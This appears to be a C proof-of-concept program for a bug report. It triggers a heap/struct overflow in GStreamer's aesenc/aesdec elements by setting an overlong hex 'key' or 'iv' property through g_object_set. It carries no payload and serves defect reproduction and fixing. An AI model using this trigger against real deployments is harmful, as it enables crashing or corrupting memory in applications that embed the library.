/*
 * Standalone reproduction for the gst_aes_hexstring2bytearray() unbounded write.
 *
 * Real, end-to-end trigger path: creates the actual "aesenc"/"aesdec" GStreamer element
 * via gst_element_factory_make() (a real public API entry point loading the real plugin)
 * and calls g_object_set() on its "key"/"iv" string properties with an attacker-controlled
 * hex string, exactly as any application embedding GStreamer would when taking a
 * key/iv value from a config file, command line, or pipeline description
 * (gst-launch-1.0 aesenc key=<hex> ...). No hand-authored internal state stands in for
 * a caller here - this *is* the real caller, using the real public property-setting API.
 *
 * Usage: repro <aesenc|aesdec> <key|iv> [hexlen]
 *   hexlen defaults to 400 (200 bytes) - both "key" (destination: filter->key,
 *   EVP_MAX_KEY_LENGTH == 64 bytes) and "iv" (destination: filter->iv,
 *   GST_AES_BLOCK_SIZE == 16 bytes) overflow their fixed-size struct field long
 *   before 200 bytes on the unpatched tree.
 */
#include <gst/gst.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int
main (int argc, char *argv[])
{
  gst_init (&argc, &argv);

  if (argc < 3) {
    g_printerr ("usage: %s <aesenc|aesdec> <key|iv> [hexlen]\n", argv[0]);
    return 2;
  }

  const gchar *elem_name = argv[1];
  const gchar *prop_name = argv[2];
  int hexlen = argc > 3 ? atoi (argv[3]) : 400;

  GstElement *elem = gst_element_factory_make (elem_name, NULL);
  if (!elem) {
    g_printerr ("could not create element %s (plugin not found on "
        "GST_PLUGIN_PATH?)\n", elem_name);
    return 2;
  }

  gchar *hexstr = g_malloc (hexlen + 1);
  for (int i = 0; i < hexlen; i++)
    hexstr[i] = "0123456789ABCDEF"[i % 16];
  hexstr[hexlen] = 0;

  g_print ("Setting %s property '%s' to a %d-char hex string (%d bytes)...\n",
      elem_name, prop_name, hexlen, hexlen / 2);
  fflush (stdout);

  g_object_set (elem, prop_name, hexstr, NULL);

  g_print ("g_object_set returned without crashing.\n");

  g_free (hexstr);
  gst_object_unref (elem);
  return 0;
}
